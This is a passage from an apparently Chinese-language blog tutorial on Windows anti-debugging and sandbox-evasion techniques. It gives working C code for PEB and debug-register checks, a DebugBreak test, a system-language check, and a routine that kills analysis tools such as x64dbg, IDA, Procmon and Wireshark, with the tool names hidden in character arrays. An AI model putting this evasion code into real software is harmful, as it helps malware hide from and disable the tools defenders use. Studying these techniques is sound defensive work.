<h4 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a>BeingDebugged</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库，提供输入输出函数，如 printf 和 scanf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// Windows API 头文件，提供大多数 Windows 操作系统功能的访问，如窗口管理和进程控制</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 仅在需要时定义简化版的PEB结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BYTE Reserved1[<span class="number">2</span>];</span><br><span class="line">    BYTE BeingDebugged; <span class="comment">// 检查此标志来确定是否在被调试</span></span><br><span class="line">    BYTE Reserved2[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// ... 其他成员</span></span><br><span class="line">&#125; PEB, * PPEB;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查当前进程是否在被调试</span></span><br><span class="line">BOOL <span class="title function_">IsDebuggerPresent2</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64   </span></span><br><span class="line">    <span class="comment">// 对于64位程序，从GS段寄存器读取PEB地址</span></span><br><span class="line">    PPEB pPeb = (PEB*)(__readgsqword(<span class="number">0x60</span>)); <span class="comment">// Process Environment Block</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _WIN32</span></span><br><span class="line">    <span class="comment">// 对于32位程序，从FS段寄存器读取PEB地址</span></span><br><span class="line">    PPEB pPeb = (PEB*)(__readfsdword(<span class="number">0x30</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (pPeb-&gt;BeingDebugged == <span class="number">1</span>) &#123; <span class="comment">// 如果BeingDebugged标志被设置</span></span><br><span class="line">        <span class="keyword">return</span> TRUE; <span class="comment">// 返回TRUE，表示正在被调试</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE; <span class="comment">// 返回FALSE，表示没有被调试</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (IsDebuggerPresent2()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 正在被调试!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 没有被调试.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071302087.png" data-fancybox="true"/></div></div>

<h4 id="DebugBreak"><a href="#DebugBreak" class="headerlink" title="DebugBreak"></a>DebugBreak</h4><p><code>DebugBreak()</code>:<code>debugbreak</code>是我们的第二个反调试技术,其中<code>DebugBreak()</code>函数会导致在当前进程中引发断点异常。这允许调用线程用信号通知调试器处理异常。因此，我们依赖于<code>GetExceptionCode()</code>函数的返回，它将告诉我们异常是否由调试器处理.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库，提供输入输出函数，如 printf 和 scanf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// Windows API 头文件，提供大多数 Windows 操作系统功能的访问，如窗口管理和进程控制</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义反调试函数</span></span><br><span class="line">BOOL <span class="title function_">CheckDebuggerPresence</span><span class="params">()</span> &#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        DebugBreak(); <span class="comment">// 触发调试中断异常，这通常会中断到调试器中，如果有调试器附加</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;  <span class="comment">// 如果代码执行到这里，说明异常被调试器处理了，返回TRUE表示正在被调试</span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) &#123;</span><br><span class="line">        <span class="comment">// 检查异常代码是否是 EXCEPTION_BREAKPOINT。如果是，执行异常处理程序。</span></span><br><span class="line">        <span class="comment">// EXCEPTION_BREAKPOINT 是一个常量，表示断点异常，通过调试器捕获。</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 未被调试器处理\n&quot;</span>);  <span class="comment">// 如果异常未被调试器处理，则打印信息并表示没有调试器附加</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;  <span class="comment">// 返回FALSE表示没有调试器在附加</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    CheckDebuggerPresence();  <span class="comment">// 调用自定义反调试函数，检查当前进程是否被调试</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ContextLogRegisters"><a href="#ContextLogRegisters" class="headerlink" title="ContextLogRegisters"></a>ContextLogRegisters</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库，提供输入输出函数，如 printf 和 scanf。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// Windows API 头文件，提供大多数 Windows 操作系统功能的访问，如窗口管理和进程控制。</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查当前线程是否被调试</span></span><br><span class="line">BOOL <span class="title function_">IsThreadBeingDebugged</span><span class="params">()</span> &#123;</span><br><span class="line">    CONTEXT Ctx;  <span class="comment">// 定义一个 CONTEXT 结构体变量，用于保存线程的上下文信息。</span></span><br><span class="line">    Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;  <span class="comment">// 设置 CONTEXT 标志，只获取调试寄存器的信息。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取当前线程的上下文信息，包括调试寄存器</span></span><br><span class="line">    <span class="keyword">if</span> (!GetThreadContext(GetCurrentThread(), &amp;Ctx)) &#123;</span><br><span class="line">        <span class="comment">// 如果获取失败，打印错误消息并显示错误代码（使用 GetLastError() 获取）</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\t\n [!] 获取线程上下文失败，错误代码：0x%lu \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;  <span class="comment">// 返回 FALSE，表示操作失败或没有调试器附加。</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查调试寄存器 Dr0, Dr1, Dr2, Dr3 是否被设置</span></span><br><span class="line">    <span class="keyword">if</span> (Ctx.Dr0 != <span class="literal">NULL</span> || Ctx.Dr1 != <span class="literal">NULL</span> || Ctx.Dr2 != <span class="literal">NULL</span> || Ctx.Dr3 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果有任意一个寄存器不为空，说明有硬件断点被设置</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 已在以下地址设置硬件断点：\n\t Dr0 地址：0x%llx \n\t Dr1 地址：0x%llx \n\t Dr2 地址：0x%llx \n\t Dr3 地址：0x%llx\n&quot;</span>, Ctx.Dr0, Ctx.Dr1, Ctx.Dr2, Ctx.Dr3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前线程正在被调试\n&quot;</span>);  <span class="comment">// 打印信息，表示线程正在被调试。</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;  <span class="comment">// 返回 TRUE，表示当前线程正在被调试。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则，表示没有调试器附加或没有设置硬件断点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] 没有设置硬件断点\n&quot;</span>);  <span class="comment">// 打印信息，表示没有硬件断点。</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;  <span class="comment">// 返回 FALSE，表示没有调试器附加。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    IsThreadBeingDebugged();  <span class="comment">// 调用函数以检查当前线程是否被调试。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="终止分析工具"><a href="#终止分析工具" class="headerlink" title="终止分析工具"></a>终止分析工具</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// 标准输入输出库，提供输入输出函数，如 printf 和 scanf。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span>    <span class="comment">// Windows API 头文件，提供大多数 Windows 操作系统功能的访问，如窗口管理和进程控制。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span>   <span class="comment">// 提供工具帮助函数，允许对系统快照进行操作，如进程和线程枚举。</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测并终止特定名称的进程</span></span><br><span class="line">BOOL <span class="title function_">TerminateDebuggingProcess</span><span class="params">(WCHAR* procname)</span> &#123;</span><br><span class="line">    BOOL processTerminated = FALSE;  <span class="comment">// 初始化标志，用于跟踪是否成功终止了任何进程。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个进程快照，用于枚举当前系统中的所有进程。</span></span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] 创建进程快照错误: %lu\n&quot;</span>, GetLastError());  <span class="comment">// 输出错误信息。</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;  <span class="comment">// 返回 TRUE 表示未能成功创建快照。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe;  <span class="comment">// 定义 PROCESSENTRY32 结构来存储进程信息。</span></span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);  <span class="comment">// 设置结构大小。</span></span><br><span class="line">    BOOL res = Process32First(hSnapshot, &amp;pe);  <span class="comment">// 获取第一个进程的信息。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (res) &#123;  <span class="comment">// 遍历所有进程。</span></span><br><span class="line">        <span class="keyword">if</span> (!wcscmp(pe.szExeFile, procname)) &#123;  <span class="comment">// 比较进程名称。</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] 找到进程 %ls 正在运行，PID: %u\n&quot;</span>, procname, pe.th32ProcessID);  <span class="comment">// 输出找到的进程信息。</span></span><br><span class="line"></span><br><span class="line">            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);  <span class="comment">// 尝试打开进程。</span></span><br><span class="line">            <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">                <span class="keyword">if</span> (TerminateProcess(hProcess, <span class="number">0</span>)) &#123;  <span class="comment">// 尝试终止进程。</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\t[+] 成功终止进程 %ls\n&quot;</span>, procname);  <span class="comment">// 输出成功信息。</span></span><br><span class="line">                    processTerminated = TRUE;  <span class="comment">// 更新标志为 TRUE。</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[!] 终止进程 %ls 失败: %lu\n&quot;</span>, procname, GetLastError());  <span class="comment">// 输出失败信息。</span></span><br><span class="line">                &#125;</span><br><span class="line">                CloseHandle(hProcess);  <span class="comment">// 关闭进程句柄。</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[!] 打开进程 %ls 句柄失败: %lu\n&quot;</span>, procname, GetLastError());  <span class="comment">// 输出打开句柄失败的信息。</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res = Process32Next(hSnapshot, &amp;pe);  <span class="comment">// 获取下一个进程的信息。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapshot);  <span class="comment">// 关闭快照句柄。</span></span><br><span class="line">    <span class="keyword">return</span> processTerminated;  <span class="comment">// 返回是否成功终止过任何进程。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个二维数组，包含需要检测和终止的进程名称。</span></span><br><span class="line">    WCHAR t[][<span class="number">18</span>] = &#123;</span><br><span class="line">        &#123; <span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// x64dbg</span></span><br><span class="line">        &#123; <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;,             <span class="comment">// IDA</span></span><br><span class="line">        &#123; <span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;,     <span class="comment">// IDA 64-bit</span></span><br><span class="line">        &#123; <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// PEStudio</span></span><br><span class="line">        &#123; <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Process Hacker</span></span><br><span class="line">        &#123; <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Procmon</span></span><br><span class="line">        &#123; <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;, <span class="comment">// Procmon 64-bit</span></span><br><span class="line">        &#123; <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Process Explorer</span></span><br><span class="line">        &#123; <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;, <span class="comment">// Process Explorer 64-bit</span></span><br><span class="line">        &#123; <span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125; <span class="comment">// Wireshark</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> numElements = <span class="keyword">sizeof</span>(t) / <span class="keyword">sizeof</span>(t[<span class="number">0</span>]);  <span class="comment">// 计算数组中进程名称的数量。</span></span><br><span class="line">    BOOL anyFailure = FALSE;  <span class="comment">// 初始化标志，用于跟踪是否有任何进程终止失败。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numElements; i++) &#123;  <span class="comment">// 遍历每个进程名称。</span></span><br><span class="line">        <span class="keyword">if</span> (!TerminateDebuggingProcess(t[i])) &#123;  <span class="comment">// 尝试终止指定名称的进程。</span></span><br><span class="line">            anyFailure = TRUE;  <span class="comment">// 如果终止失败，更新标志。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (anyFailure) &#123;  <span class="comment">// 如果有任何终止失败的进程。</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n某些进程终止失败\n&quot;</span>);  <span class="comment">// 输出失败信息。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 返回 0 表示程序执行完毕。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071302968.png" data-fancybox="true"/></div></div>

<h3 id="常规手段"><a href="#常规手段" class="headerlink" title="常规手段"></a>常规手段</h3><h4 id="检查语言"><a href="#检查语言" class="headerlink" title="检查语言"></a>检查语言</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查系统的用户界面语言是否是非中文</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">checkLan</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取当前用户默认的UI语言标识符</span></span><br><span class="line">    LANGID langId = GetUserDefaultUILanguage();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查语言ID的主要语言部分是否为中文</span></span><br><span class="line">    <span class="keyword">if</span> (PRIMARYLANGID(langId) == LANG_CHINESE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 如果是中文，返回false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 如果不是中文，返回true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 调用 checkLan 函数并根据返回值输出对应信息</span></span><br><span class="line">    <span class="keyword">if</span> (checkLan()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system&#x27;s UI language is not Chinese.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system&#x27;s UI language is Chinese.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查用户名"><a href="#检查用户名" class="headerlink" title="检查用户名"></a>检查用户名</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 